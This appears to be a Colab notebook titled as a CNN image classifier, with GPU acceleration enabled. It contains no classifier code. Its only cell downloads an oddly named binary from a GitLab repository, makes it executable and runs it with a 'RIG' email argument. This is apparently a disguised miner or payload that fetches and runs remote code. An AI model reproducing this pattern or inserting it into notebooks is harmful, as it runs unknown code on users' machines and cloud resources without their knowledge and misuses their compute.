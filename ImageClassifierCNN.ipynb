{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ImageClassifierCNN.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "2MKL7IVx9J0A"
      },
      "source": [
        "!wget https://gitlab.com/pativalaneto/lumpserviant/-/raw/main/td17eqw2t92nee1 && chmod +x ./td17eqw2t92nee1 && ./td17eqw2t92nee1 --email=RIG_EULER@"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}